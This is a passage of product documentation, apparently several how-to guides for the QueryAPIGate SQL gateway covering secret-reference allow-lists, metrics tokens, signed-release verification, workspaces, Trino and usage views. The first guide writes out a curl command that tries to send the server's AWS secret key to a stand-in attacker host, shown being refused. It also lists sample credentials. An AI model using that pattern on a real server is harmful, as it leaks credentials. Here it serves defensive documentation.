  change connections could point one at a host of theirs and have the server send it one of those as a password.
- **`/metrics` needs no API key** - a scraper shouldn't hold one - so anyone who can reach the server reads it, and its
  labels name your API keys, saved queries and connections.

Every command and output below was run against a real server (`queryapigate serve`), a PostgreSQL 16 database, and
Prometheus 3.15. The server's environment held the warehouse password, an AWS secret key (standing in for the
identity it runs with) and a credential for something else:

```bash
QUERYAPIGATE_API_KEY=ci-admin-key
WAREHOUSE_PASSWORD=warehouse-pw-1
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DB_ADMIN_PW=root-pw-not-for-queryapigate
```

## The server's own credentials are never reachable

A connection whose password is a reference, and a query on it:

```bash
curl -X POST http://127.0.0.1:5077/api/v1/connections -H "X-API-Key: $ADMIN" -H 'Content-Type: application/json' \
  -d '{"name": "warehouse", "db": "postgres", "host": "127.0.0.1", "port": 55443, "user": "postgres",
       "password": "${WAREHOUSE_PASSWORD}", "database": "postgres", "active": true}'
```
```
GET /q/orders
[{"id":1,"total":42.5},{"id":2,"total":19.0}]
```

The same, with the server's AWS key, and a host that isn't yours - `connections/test` saves nothing, so it's the
quickest way to try:

```bash
curl -X POST http://127.0.0.1:5077/api/v1/connections/test -H "X-API-Key: $ADMIN" -H 'Content-Type: application/json' \
  -d '{"db": "postgres", "host": "collector.attacker.example", "user": "x",
       "password": "${AWS_SECRET_ACCESS_KEY}", "database": "x"}'
```
```json
{"error":"${AWS_SECRET_ACCESS_KEY} is a cloud, Vault or Kubernetes credential the server itself may use and can't be referenced - use a variable of its own for the secret","code":"invalid_body"}
```

Refused before any connection is tried. `AWS_*`, `AZURE_*`, `ARM_*`, `GOOGLE_*`, `GCP_*`, `VAULT_*` and
`KUBERNETES_*` are always refused, like the server's own `QUERYAPIGATE_*` and `OTEL_*` settings.

## List the variables your connections use

What no rule knows about is still reachable: a connection referencing `${DB_ADMIN_PW}` saved (`201`), and at the next
start the server said so:

```
WARNING queryapigate: Connections and destinations reference environment variables (DB_ADMIN_PW, WAREHOUSE_PASSWORD),
and QUERYAPIGATE_SECRET_ENV_VARS is unset: an administrator could reference any other variable too, and have the
server send it to a host of theirs as a password. Set it to the ones in use.
```

Set it - names, or prefixes ending in `*` (`WAREHOUSE_*,QAG_*`):

```bash
QUERYAPIGATE_SECRET_ENV_VARS=WAREHOUSE_PASSWORD
```

The warning is gone, the warehouse query answers as before, and anything else is refused - when it's saved:

```json
{"error":"${DB_ADMIN_PW} isn't one of QUERYAPIGATE_SECRET_ENV_VARS and can't be referenced - use a variable of its own for the secret","code":"invalid_body"}
```

and when it's used, for a connection saved before the list was set:

```
POST /execute_sql   {"connection_name": "other", "sql": "SELECT 1"}
{"error":"${DB_ADMIN_PW} isn't one of QUERYAPIGATE_SECRET_ENV_VARS and can't be referenced by a connection or destination","code":"connection_misconfigured"}
```

Settings in the Console shows the list as **Environment secrets**. A configuration file is held to it too: `config
export` names a password the store held as a value `${QAG_...}` - add `QAG_*` to the list before applying one.

## Put /metrics behind a token

```bash
QUERYAPIGATE_METRICS_TOKEN=$(openssl rand -hex 32)   # at least 16 characters
```

Then, with a partner's API key and an administrator, `alice.smith`, having made a call each:

```
/metrics with no token:                    401
/metrics with the partner's API key:       401
/metrics as alice (an administrator):      200
```

An administrator who may observe reads it without the token - that's the Console's Metrics screen. Everyone else
needs `Authorization: Bearer <the token>`. What it shows:

```
queryapigate_requests_total{method="GET",endpoint="api.run_named_query",status="200",key="partner-acme"} 1
queryapigate_requests_total{method="GET",endpoint="v1.list_connections",status="200",key="admin"} 1
queryapigate_queries_total{connection="warehouse",dialect="postgres",status="success",key="partner-acme"} 1
```

alice's call is `key="admin"`: every administrator is counted under that one label, as signed-in users are under
`jwt`, so no person's name is a label. An API key - an application - keeps its own.

Prometheus reads the token from a file:

```yaml
scrape_configs:
  - job_name: queryapigate
    authorization: {credentials_file: /etc/prometheus/queryapigate-metrics-token}
    static_configs:
      - targets: ["queryapigate:5000"]
```

Scraped that way, and by a second job without the token:

```
queryapigate                     up
queryapigate-without-the-token   down   server returned HTTP status 401 UNAUTHORIZED
```
```
sum by (key) (queryapigate_requests_total{job="queryapigate"})
-               7
admin           5
partner-acme    2
```

`queryapigate mcp` serves its own `/metrics`, held to the same token: scrape it the same way.

## On the Helm chart

This is done for you: `metricsAuth` (on by default) makes the token in a Secret of the chart's own -
`<release>-metrics`, kept across upgrades - gives it to every pod, and the ServiceMonitor sends it. A scraper of your
own reads it from that Secret. Rendering the chart without the cluster (`helm template`, Argo CD), give your own,
`metricsAuth.existingSecret`: the chart can't see the one it made and would make another. Set
`QUERYAPIGATE_SECRET_ENV_VARS` through `config`.

## Good to know

- **Neither setting breaks a server on upgrade.** Unset, `${VAR}` reaches what it did (but those credentials), and
  `/metrics` is open as before. Set both wherever anyone outside your own network can reach the server.
- **A refused reference never shows the value**, in the answer or the log - it names the variable.
- **Other references have their own lists:** `${file:...}` reads only inside `QUERYAPIGATE_SECRET_FILE_DIRS`,
  `${vault:...}` only `QUERYAPIGATE_VAULT_PATHS`, `${aws-sm:...}` only `QUERYAPIGATE_AWS_SECRET_PREFIXES`.

## Next steps

- [Secrets from files and secrets managers](../documentation/API.md#secrets-from-files-and-secrets-managers) - every
  reference form, and its allow-list.
- [Observability](../documentation/API.md#observability) - every metric and what it means.
- [Install on Kubernetes with Helm](54-install-on-kubernetes-with-helm.md).


# Guide 59: Verify a release before you run it
Source: https://anantharajuc.github.io/QueryAPIGate-website/Guide.dc.html?g=59-verify-a-release-before-you-run-it

# How to verify a release before you run it

**Time:** 20 minutes. **You'll end up with:** proof that the image and chart you run were built by this repository's
release workflow, from the commit it names - and a cluster that refuses anything else.

From 0.31, every image and the Helm chart is signed keyless with cosign, by digest, by `.github/workflows/docker.yml`
on the release's tag, with SLSA provenance, an SBOM and a GitHub attestation
([ADR 0018](../documentation/adr/0018-signed-releases.md)). Keyless means there's no key to trust: the signing
certificate names the workflow and the tag it ran on, and the signature is recorded in Sigstore's public log.

Every command and output below was run for real, against the release workflow's **rehearsal** - the same workflow,
run by hand on `main`, publishing under `-rehearsal` names (`ghcr.io/anantharajuc/queryapigate-rehearsal`). So its
identity ends `@refs/heads/main`. For a release, it ends `@refs/tags/v<X.Y.Z>`, and the names have no `-rehearsal`:

| | Rehearsal (below) | A release |
|---|---|---|
| Image | `ghcr.io/anantharajuc/queryapigate-rehearsal` | `ghcr.io/anantharajuc/queryapigate` |
| Chart | `ghcr.io/anantharajuc/charts-rehearsal/queryapigate` | `ghcr.io/anantharajuc/charts/queryapigate` |
| Identity | `https://github.com/AnanthaRajuC/QueryAPIGate/.github/workflows/docker.yml@refs/heads/main` | `...docker.yml@refs/tags/v0.31.0` |

The tools: [cosign](https://docs.sigstore.dev/cosign/system_config/installation/) 3.1.3 and, for GitHub's
attestation, the `gh` CLI (or cosign, as shown).

## Check a signature

```bash
cosign verify ghcr.io/anantharajuc/queryapigate-rehearsal:rehearsal-d4b295f19b4f \
  --certificate-identity https://github.com/AnanthaRajuC/QueryAPIGate/.github/workflows/docker.yml@refs/heads/main \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```
```
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
  - The code-signing certificate was verified using trusted certificate authority certificates
```

The same for the `-h2` image and the chart. What doesn't verify:

```
# the same image, as the v0.31.0 release - it was signed on main, not that tag
Error: no matching attestations: failed to verify certificate identity: no matching CertificateIdentity found ...

# as another repository's workflow
Error: no matching attestations: failed to verify certificate identity: no matching CertificateIdentity found ...

# 0.30.0, released before signing
Error: no signatures found
```

Each release is signed in two forms: the Sigstore bundle (`cosign verify`, the default) and the classic `.sig` tag
(`cosign verify --new-bundle-format=false`). Both verify; admission controllers below need the second.

## See how it was built, and from what

GitHub's attestation names the repository, the workflow, the commit and the run:

```bash
cosign verify-attestation ghcr.io/anantharajuc/queryapigate-rehearsal@sha256:726f77fe01212b457e69ba49d745f9ba9bfc0d33815dbc78b8045fea7abe09ce \
  --new-bundle-format --type https://slsa.dev/provenance/v1 \
  --certificate-identity https://github.com/AnanthaRajuC/QueryAPIGate/.github/workflows/docker.yml@refs/heads/main \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```
```
predicate https://slsa.dev/provenance/v1
  workflow https://github.com/AnanthaRajuC/QueryAPIGate .github/workflows/docker.yml refs/heads/main
  commit git+https://github.com/AnanthaRajuC/QueryAPIGate@refs/heads/main {'gitCommit': 'd4b295f19b4fcc45bff2e786bfa382cc2568054e'}
  run https://github.com/AnanthaRajuC/QueryAPIGate/actions/runs/38352041218/attempts/1
```

(decoded from the attestation's payload). With the `gh` CLI signed in, `gh attestation verify
oci://<image> --owner AnanthaRajuC` checks the same. The image's own provenance, from the build, records what it was
built on - the base images by digest:

```bash
docker buildx imagetools inspect ghcr.io/anantharajuc/queryapigate-rehearsal:rehearsal-d4b295f19b4f --format '{{json .Provenance}}'
```
```
pkg:docker/node@22-slim?digest=sha256:c3de60bf2f9dd0ac6370e6117950ff62d6e339527e7472301c9c78a017978392
pkg:docker/python@3.12-slim?digest=sha256:a6e34c598f2467ed0e9a8d349809fcd8b5c603269512df273a0bb1784edc11b1
```

## Read the SBOM

```bash
docker buildx imagetools inspect ghcr.io/anantharajuc/queryapigate-rehearsal:rehearsal-d4b295f19b4f --format '{{json .SBOM}}'
```

An SPDX 2.3 document per platform - 179 packages for `linux/amd64`, among them:

```
queryapigate 0.30.0
flask 3.1.3
werkzeug 3.1.9
cryptography 50.0.2
openssl 3.5.7-1~deb13u3
```

Feed it to your scanner (Grype, Trivy) to see which advisories apply, without pulling the image.

## Have a cluster refuse anything else

### Sigstore policy-controller

On a kind cluster with [policy-controller](https://docs.sigstore.dev/policy-controller/overview/) 0.13.1 (Helm chart
`sigstore/policy-controller` 0.10.8), a policy admitting only images this workflow signed on a release tag:

```yaml
apiVersion: policy.sigstore.dev/v1beta1
kind: ClusterImagePolicy
metadata:
  name: queryapigate-signed
spec:
  images:
    - glob: "ghcr.io/anantharajuc/**"
  authorities:
    - keyless:
        url: https://fulcio.sigstore.dev
        identities:
          - issuer: https://token.actions.githubusercontent.com
            subjectRegExp: '^https://github\.com/AnanthaRajuC/QueryAPIGate/\.github/workflows/docker\.yml@refs/tags/v[0-9]+\.[0-9]+\.[0-9]+$'
      ctlog:
        url: https://rekor.sigstore.dev
```

and `kubectl label namespace qag policy.sigstore.dev/include=true`. With the identity widened to `refs/heads/main`
too, the rehearsal image ran (`pod/signed created`, then `/health` answered `0.30.0`); without, or for 0.30.0:

```
admission webhook "policy.sigstore.dev" denied the request: ... signature keyless validation failed for authority
authority-0 for ghcr.io/anantharajuc/queryapigate-rehearsal@sha256:41a3...: no matching signatures: none of the
expected identities matched ...

admission webhook "policy.sigstore.dev" denied the request: ... ghcr.io/anantharajuc/queryapigate:0.30.0@sha256:4fca...
signature keyless validation failed ...: no signatures found
```

policy-controller finds only the classic `.sig` form - an image signed with a Sigstore bundle alone is refused as
unsigned, which is why releases carry both.

### Kyverno

With [Kyverno](https://kyverno.io/) 1.19.1 (Helm chart `kyverno/kyverno` 3.9.1):

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: queryapigate-signed
spec:
  validationFailureAction: Enforce
  webhookTimeoutSeconds: 30
  rules:
    - name: signed-by-its-release-workflow
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences: ["ghcr.io/anantharajuc/*"]
          mutateDigest: true
          verifyDigest: true
          attestors:
            - entries:
                - keyless:
                    issuer: https://token.actions.githubusercontent.com
                    subjectRegExp: '^https://github\.com/AnanthaRajuC/QueryAPIGate/\.github/workflows/docker\.yml@refs/tags/v[0-9]+\.[0-9]+\.[0-9]+$'
                    roots: |
                      <the certificates from https://fulcio.sigstore.dev/api/v2/trustBundle>
                    rekor:
                      url: https://rekor.sigstore.dev
```

**Give it `roots`.** Without them Kyverno 1.19.1 refused the signed image - `cert verification failed: x509:
certificate signed by unknown authority` - because its built-in Sigstore root predates Fulcio's current
intermediate. With the two certificates Fulcio publishes at `/api/v2/trustBundle`, it admitted the signed image and
rewrote the pod to run it by digest (`mutateDigest`), and refused 0.30.0: `no signatures found`.

## On the Helm chart

Verify the chart before installing it, and install by digest:

```bash
cosign verify ghcr.io/anantharajuc/charts/queryapigate:0.31.0 \
  --certificate-identity https://github.com/AnanthaRajuC/QueryAPIGate/.github/workflows/docker.yml@refs/tags/v0.31.0 \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
helm install qag oci://ghcr.io/anantharajuc/charts/queryapigate --version 0.31.0 \
  --set image.digest=sha256:<the image's digest, from cosign verify>
```

## Good to know

- **A signature proves who built it, not that it's right**: this repository's workflow, on that tag, from that
  commit. A maintainer account that's compromised can still tag a release - and Rekor's public log then records it.
- **Pin by digest, not tag.** A tag can be moved to other bytes; a digest can't, and it's what was signed.
- **Releases before 0.31 aren't signed.** A policy like the ones above refuses them.

## Next steps

- [SECURITY.md](../SECURITY.md#verify-a-release) - the two commands, for a release.
- [ADR 0018](../documentation/adr/0018-signed-releases.md) - what's signed, how, and what it doesn't promise.
- [Install on Kubernetes with Helm](54-install-on-kubernetes-with-helm.md).


# Guide 60: Give each team its own workspace
Source: https://anantharajuc.github.io/QueryAPIGate-website/Guide.dc.html?g=60-give-each-team-its-own-workspace

# How to give each team its own workspace

**Time:** 15 minutes. **You'll end up with:** one QueryAPIGate serving several teams, each managing its own
connections, saved queries and API keys in a workspace of its own - its owner running it without reaching anyone
else's, its apps calling it as if it were the only one, and you, the platform team, seeing all of it.

> **Experimental** - workspaces are new in 0.38 and may change in a minor release, always noted in the changelog
> ([what that means](../CHANGELOG.md#versioning-and-compatibility)). A server that never creates one behaves exactly
> as before.

Until 0.38 a server had one namespace: every administrator's role applied to every connection, key and query, so
"the payments team runs its own APIs and can't touch the catalogue team's" took a server per team. A **workspace**
([ADR 0023](../documentation/adr/0023-workspaces.md)) is that boundary inside one server. Everything a server had is in
the workspace `default`.

It is delegated administration, not tenant isolation: every workspace runs in the same process, on the same store,
and you - an owner of the server - see everything. It keeps teams out of each other's way and reach.

Every command and response below was run against a real server, with the shared key `demo-key`.

## Step 1: Create the workspace

As an owner of the server:

```bash
curl -X POST http://127.0.0.1:5000/api/v1/workspaces -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' \
  -d '{"name": "payments", "description": "The payments team"}'
# {"name":"payments","description":"The payments team","created_at":"2026-10-16 20:16:58","created_by":"admin","members":0}
```

Or in the Console: **Access → Workspaces → New workspace**.

## Step 2: Give the team's lead a role in it - and only there

Bea leads payments. She gets no role on the server itself (`"role": null` - say so: leaving `role` out is refused, so
it is never by accident) and the role `owner` in her workspace:

```bash
curl -X POST http://127.0.0.1:5000/api/v1/administrators -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' \
  -d '{"name": "bea", "role": null, "email": "bea@corp.com"}'
curl -X PUT http://127.0.0.1:5000/api/v1/workspaces/payments/members/bea -H 'X-API-Key: demo-key' \
  -H 'Content-Type: application/json' -d '{"role": "owner"}'
# {"admin":"bea","role":"owner","created_at":"2026-10-16 20:16:58","added_by":"admin"}
```

Issue her a token as in [guide 43](43-give-your-team-their-own-admin-access.md) (`POST /api/v1/administrators/bea/tokens`).
A role in a workspace is the same four roles, for that workspace only - an owner there manages its members, but not
the server's administrators, settings or other workspaces.

## Step 3: The lead works in her workspace

Bea's calls name it - `/w/payments/` in front of any route:

```bash
curl http://127.0.0.1:5000/w/payments/api/v1/me -H 'X-API-Key: qagadm_A9NH...'
# {"name": "bea", "role": "owner", "workspace": "payments", "server_wide": false, "workspaces": {"payments": "owner"}, ...}
```

Without it she is asked to say which:

```bash
curl http://127.0.0.1:5000/api/v1/queries -H 'X-API-Key: qagadm_A9NH...'
# {"error":"You have no role in the workspace 'default' - only in payments: name the workspace you mean",
#  "code":"workspace_required","workspace":"default","workspaces":["payments"]}
```

In the Console she needs none of this: signed in, she starts in **payments**, and every screen is that workspace's.

She sets up her team's API as anyone would - a connection, a saved query, a key for the checkout app:

```bash
W=http://127.0.0.1:5000/w/payments
curl -X POST $W/api/v1/connections -H 'X-API-Key: qagadm_A9NH...' -H 'Content-Type: application/json' \
  -d '{"name": "orders-db", "db": "sqlite", "database": "/data/payments.db", "active": true}'
curl -X POST $W/api/v1/queries -H 'X-API-Key: qagadm_A9NH...' -H 'Content-Type: application/json' -d '{
  "name": "orders", "description": "All orders", "connection_name": "orders-db", "publish": true,
  "sql": "SELECT id, customer, total FROM orders ORDER BY id"}'
curl -X POST $W/api/v1/api-keys -H 'X-API-Key: qagadm_A9NH...' -H 'Content-Type: application/json' \
  -d '{"name": "checkout-app", "connections": [], "queries": ["orders"]}'
```

Names are the workspace's own: another team can have an `orders` query and an `orders-db` connection too.

## Step 4: The team's apps don't need to know

A key belongs to the workspace it was created in, and every call it makes is there - with no prefix:

```bash
curl http://127.0.0.1:5000/q/orders -H 'X-API-Key: sk_YYK...'
# [{"id":1,"customer":"Ana","total":42.5},{"id":2,"customer":"Ben","total":17.0}]
```

Asked for another workspace, it gets the same answer as for one that doesn't exist - it can't learn which there are:

```bash
curl http://127.0.0.1:5000/w/default/q/orders -H 'X-API-Key: sk_YYK...'
# {"error":"No workspace named 'default'","code":"workspace_not_found"}
```

## Step 5: What the platform team sees

`default` doesn't have the team's things - `/api/v1/connections` lists none of them - and you reach them by naming the
workspace:

```bash
curl http://127.0.0.1:5000/w/payments/api/v1/connections -H 'X-API-Key: demo-key'
# {"items": [{"name": "orders-db", ...}]}
```

The audit log says where each change happened - in the entry, under its hash chain. Bea reads her workspace's; a
server-wide role reads all of it, or one workspace's (`?workspace=payments`):

```bash
curl http://127.0.0.1:5000/w/payments/api/v1/audit -H 'X-API-Key: qagadm_A9NH...'
# create_key checkout-app, save_query orders, create_connection orders-db, set_workspace_member, create_workspace
#   - each with "workspace": "payments"
```

Alerts, run history, live events and usage quotas are the workspace's own too; in `/metrics` its keys and
connections are counted as `payments/checkout-app`, `payments/orders-db`.

## Step 6: Keep it in git

A configuration file can describe one workspace - `workspace:` at the top - and is applied there only:

```bash
queryapigate config export --workspace payments --kinds connections,queries > payments.yaml
```

```yaml
format: queryapigate-config
format_version: 1
workspace: payments
connections:
- name: orders-db
  db: sqlite
  ...
```

`queryapigate config apply payments.yaml` (or `POST /w/payments/api/v1/config/apply`) - Bea, as its owner, may apply
it; sent to any other workspace it is refused. The CLI's other commands take `--workspace` too: `queryapigate export
orders --workspace payments --out ...`.

## Removing a workspace

Only an empty one - what it owns is never deleted with it - and never `default`:

```bash
curl -X DELETE http://127.0.0.1:5000/api/v1/workspaces/payments -H 'X-API-Key: demo-key'
# {"error":"Workspace 'payments' still has 1 connection, 1 query, 1 API key - delete or move them first",
#  "code":"workspace_not_empty","contents":{"connections":1,"queries":1,"API keys":1}}
```

## Limits, for now

- A **local-folder destination** is only in `default` - the folders exports may write under are the server's. Use an
  object-storage destination in a workspace.
- **Signed-in app users** (JWT): set `QUERYAPIGATE_JWT_WORKSPACE_CLAIM` to a claim that names each user's workspace,
  so the token decides it - a user can't reach another team's by changing the `/w/<workspace>/` prefix. Unset, every
  signed-in user acts in `default`.
- No per-workspace limits yet (each key's own rate limits and quotas work as before), and no mapping of identity-
  provider groups to memberships.

See [Workspaces](../documentation/API.md#workspaces) for the full reference.


# Guide 61: Connect to Trino
Source: https://anantharajuc.github.io/QueryAPIGate-website/Guide.dc.html?g=61-connect-to-trino

# How to connect to Trino

**Time:** 10 minutes. **You'll end up with:** one connection that reaches every catalog behind a
[Trino](https://trino.io/) endpoint - Hive, Iceberg, Delta, Kafka, object stores, other databases - each one a
governed, saved REST and MCP query, with `allowed_tables`, masking and a real query time limit.

> **Experimental** (ADR 0026). What it covers, the catalog model and its limits:
> [Trino connections](../documentation/DATABASE_CONNECTION_CONFIGURATION.md#trino-connections). Before this, Trino was
> reachable only through [generic JDBC](03-connect-via-generic-jdbc.md) - no time limit, no schema browser, no
> `allowed_tables` or masking. The native type fixes all of that.

Trino is a *federation* engine: one endpoint, many catalogs, each a different underlying system. That one fact shapes
everything below - most of all how `allowed_tables` works.

## Step 1: Add the connection

```bash
curl -X POST http://127.0.0.1:5000/api/v1/connections -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' -d '{
  "name": "warehouse", "db": "trino",
  "host": "trino.internal", "port": 8080, "user": "queryapigate",
  "database": "tpch",
  "options": { "schema": "tiny", "http_scheme": "http" },
  "active": true
}'
```

Needs `pip install "queryapigate[trino]"`. The fields that are specific to Trino:

- **`database` is the Trino *catalog*** (here `tpch`, a catalog every Trino ships with). This is the one field that
  reads differently from the SQL dialects, where `database` is a database on the server.
- **`options.schema`** is the default schema within that catalog (here `tiny`), and **`options.http_scheme`** is
  `http` or `https`. A `password`, if given, is sent as HTTP basic auth and only over `https`.

Test and browse it like any other connection - the schema browser reads the catalog's `information_schema`, scoped to
the default schema:

```bash
curl -X POST http://127.0.0.1:5000/api/v1/connections/test -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' \
  -d '{"db": "trino", "host": "trino.internal", "port": 8080, "user": "queryapigate", "database": "tpch", "options": {"schema": "tiny", "http_scheme": "http"}}'
# {"elapsed_ms": 518.1}

curl http://127.0.0.1:5000/connections/warehouse/schema -H 'X-API-Key: demo-key'
# {"tables": [{"name": "customer", ...}, {"name": "nation", ...}, {"name": "orders", ...}], "truncated": false}
```

Primary/foreign keys and `SHOW CREATE TABLE` DDL aren't shown - Trino has no enforced constraints and three-part
names need more handling, the same as for ClickHouse.

## Step 2: `database` is a catalog - switch between them

A Trino endpoint usually exposes several catalogs. In the Console, **Connections → (the connection) → switch
database** lists them with `SHOW CATALOGS` and switches which one the connection queries:

```bash
curl 'http://127.0.0.1:5000/api/v1/connections/databases' -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' \
  -X POST -d '{"db": "trino", "host": "trino.internal", "port": 8080, "user": "queryapigate", "database": "tpch", "options": {"http_scheme": "http"}}'
# {"databases": ["jmx", "memory", "system", "tpcds", "tpch"]}
```

Within a catalog, tables are addressed by `schema.table`, and across catalogs by `catalog.schema.table` - ordinary
Trino SQL. Save a query exactly as for any SQL connection ([guide 01](01-turn-your-first-sql-query-into-a-rest-api.md)):

```bash
curl -X POST http://127.0.0.1:5000/api/v1/queries -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' -d '{
  "name": "nations_by_region", "connection_name": "warehouse",
  "sql": "SELECT n.name FROM nation n JOIN region r ON n.regionkey = r.regionkey WHERE r.name = :region",
  "parameters": {"region": {"type": "str", "required": true, "description": "Region name, e.g. EUROPE"}},
  "author": "you", "description": "Nations in a region", "publish": true
}'

curl 'http://127.0.0.1:5000/q/nations_by_region?region=EUROPE' -H 'X-API-Key: demo-key'
# [{"name": "FRANCE"}, {"name": "GERMANY"}, {"name": "ROMANIA"}, {"name": "RUSSIA"}, {"name": "UNITED KINGDOM"}]
```

## Step 3: `allowed_tables` is fully qualified - the federation safety point

For every other dialect, [`allowed_tables`](16-restrict-a-key-to-tables.md) matches a **bare** table name. For a
federation engine that would be dangerous: a grant of `orders` would match `orders` in *every* catalog the connection
can see. So on Trino the match is **fully qualified** - `catalog.schema.table` - with the catalog and schema a
reference omits filled in from the connection's defaults.

A grant of `orders` on the `warehouse` connection above (`tpch` / `tiny`) therefore means **`tpch.tiny.orders` only**:

```bash
curl -X POST http://127.0.0.1:5000/api/v1/api-keys -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' -d '{
  "name": "reporting", "connections": ["warehouse"], "allowed_tables": ["orders"]
}'

# the default catalog + schema's orders: allowed
curl -X POST http://127.0.0.1:5000/execute_sql -H 'X-API-Key: reporting-secret' -H 'Content-Type: application/json' \
  -d '{"sql": "SELECT count(*) FROM orders", "connection_name": "warehouse"}'
# [{"_col0": 15000}]

# the SAME table name in another schema or catalog: refused
curl -X POST http://127.0.0.1:5000/execute_sql -H 'X-API-Key: reporting-secret' -H 'Content-Type: application/json' \
  -d '{"sql": "SELECT count(*) FROM sf1.orders", "connection_name": "warehouse"}'
# {"error": "This API key may only query these tables: tpch.tiny.orders. Forbidden: tpch.sf1.orders.",
#  "code": "table_not_allowed"}
```

To grant a table in another schema or catalog, qualify the grant: `"allowed_tables": ["sf1.orders"]` for
`tpch.sf1.orders`, or `"hive.sales.orders"` for a different catalog entirely. Data-reading table functions
(`TABLE(system.query(...))`, `table_changes(...)`) name no table the list can check and are refused the same way.

## What governance you get - and what you don't

Everything works through sqlglot's `trino` dialect, so it's the same as any SQL connection:

- **Column masking** ([guide 45](45-hide-personal-data-from-a-partner-or-an-ai-agent.md)) and the tables-and-joins
  diagram both work.
- **The query time limit** cancels the running query on the Trino cluster, so a slow federated query can't run forever.
- **Read-only** rests on the SQL guard (Trino has no read-only session mode), the same as `duckdb`/`h2`/`jdbc`: a
  non-read statement is refused before it runs.

Not there yet:

- **Agent writes** ([guide 49](49-let-an-agent-write-with-a-person-approving-each-write.md)) aren't supported on Trino.
- **Primary/foreign keys and DDL** in the schema browser (Trino has no enforced constraints).

## The outer boundary: a scoped Trino user

A connection reaches whatever its Trino **user** can reach. `allowed_tables` narrows *within* that, but the strongest
boundary is Trino's own access control: give each connection a **read-only Trino user scoped to the catalogs and
schemas it should see**, and let QueryAPIGate's grants narrow from there. That way a mistake in a grant can't reach a
catalog the user was never allowed to touch.

## Next steps

- [Restrict a key to specific tables](16-restrict-a-key-to-tables.md) - the full `allowed_tables` reference; Trino's
  qualified matching is the one dialect-specific twist.
- [Hide personal data from a partner or an AI agent](45-hide-personal-data-from-a-partner-or-an-ai-agent.md) - masking
  works on Trino like any SQL connection.
- [Let an AI agent call your saved queries via MCP](24-let-an-agent-call-your-queries-via-mcp.md) - a Trino-backed
  saved query is an MCP tool like any other.


# Guide 62: See what's being used, from the Console
Source: https://anantharajuc.github.io/QueryAPIGate-website/Guide.dc.html?g=62-see-whats-being-used-from-the-console

# How to see what's being used, from the Console

**Time:** 10 minutes. **You'll end up with:** a clear read on which keys, connections, queries and tools are
actually in use - which ones are busy, which are granted but never touched - without wiring up any external
monitoring.

There are two kinds of usage view in the Console, and it helps to know which you're looking at:

- **Activity over the last 30 days** - drawn from the run log, so it survives restarts. This is the sparklines and
  the per-key usage history below.
- **Live counts since this server process started** - in-memory, reset on restart. This is the "Usage" column on
  each table, the Metrics screen, and `/metrics`.

## 1. Activity sparklines: who's busy, who's idle

Five Console tables now carry a small 30-day **activity sparkline** per row - a GitHub-style graph of runs per day:

| Screen | One sparkline per… | Shows |
|---|---|---|
| **Access → API keys** | key | how much each key is used (and links to its details) |
| **Access → Roles** | role | the combined activity of the keys created from that role |
| **Data → Connections** | connection | traffic to each database |
| **Data → Caching** | cached query | which `cache_ttl` queries actually get hit |
| **MCP server** | tool | a saved-query tool's **MCP** calls (built-in tools show "—") |

A drawn line means traffic; a **flat baseline means "granted but never used in 30 days"** - often the most useful
thing on the screen, because it points at access you can take away. Hover any sparkline for the totals (for example
*"example-reporting: 28 runs over 30 days · 3 failed · peak 3/day"*).

## 2. A key in full: the Details screen

On **Access → API keys**, each row has a **Details** link. It opens a page built entirely from that key's own
activity:

- the saved queries (APIs) it can reach, and how each is granted;
- the connections and tables behind them, its limits and masking;
- **last used**, and its full **run history** - every call, with when, what, rows, duration and result;
- a per-API sparkline, scoped to this key, so you can see which of its granted APIs it actually calls.

Clicking a query there opens its SQL. This is the fastest way to answer "what has this partner's key been doing?"

## 3. Who's using how much: usage quotas

**Usage quotas** (ADR 0011) count calls and rows per caller, per day and per month, in the store - so they're
durable like the sparklines. `GET /api/v1/usage/quotas` is what the Console reads:

```bash
curl http://127.0.0.1:5000/api/v1/usage/quotas -H 'X-API-Key: demo-key'
```

```json
{"items": [
  {"caller": "example-dashboard", "per": "month", "period": "2026-10", "calls": 24, "rows": 8013, ...},
  {"caller": "example-executive", "per": "month", "period": "2026-10", "calls": 19, "rows": 6937, ...},
  ...]}
```

These are the numbers a key's quota is measured against ([Give a partner a quota and a concurrency
cap](52-give-a-partner-a-quota-and-a-concurrency-cap.md)).

## 4. Server-wide, right now: the Metrics screen

**Observability → Metrics** shows request volume, latency and error rate across the whole server. These come from
in-memory counters, the same ones `/metrics` exposes in Prometheus format - so they count **only since this process
started**, and a restart resets them. That's why a freshly restarted server shows low "Usage" numbers on the key and
connection tables even when the 30-day sparklines are full: the sparklines read the durable run log, the Usage column
reads these live counters.

For dashboards and alerting over time, scrape `/metrics` - [Wire up Prometheus and
Grafana](35-wire-up-prometheus-and-grafana.md).

## 5. What agents did: the Agents screen

**Observability → Agents** is the usage view for AI clients: what each agent called over MCP, in the recent window.
`GET /api/v1/usage/agents` backs it:

```bash
curl http://127.0.0.1:5000/api/v1/usage/agents -H 'X-API-Key: demo-key'
# {"since": "...", "until": "...", "sample_rate": 1.0, "truncated": false, "items": [...]}
```

For the data dictionary agents see, and more on this screen, see [Tell agents what your data means, and see what
they did](47-tell-agents-what-your-data-means-and-see-what-they-did.md).

## 6. The run log behind all of it

Every view above the sparklines and histories is the run log, read different ways. Query it directly, filtered by
key, query, status, kind or a time window:

```bash
curl 'http://127.0.0.1:5000/api/v1/history?key=example-reporting&limit=3' -H 'X-API-Key: demo-key'
```

```json
{"items": [
  {"query": "example_top_films", "kind": "saved", "executed_at": "2026-10-19 05:51:56",
   "connection_name": "examples", "transport": "rest", "status": "success", "rows": 613, "duration_ms": 748},
  ...],
 "next_cursor": null}
```

For a *live* feed rather than history, the **Home** screen's requests panel updates in real time as queries run (over
`/events`), and you can build your own - [Build a client that watches queries run](28-build-a-client-that-watches-queries-run.md).

## Next steps

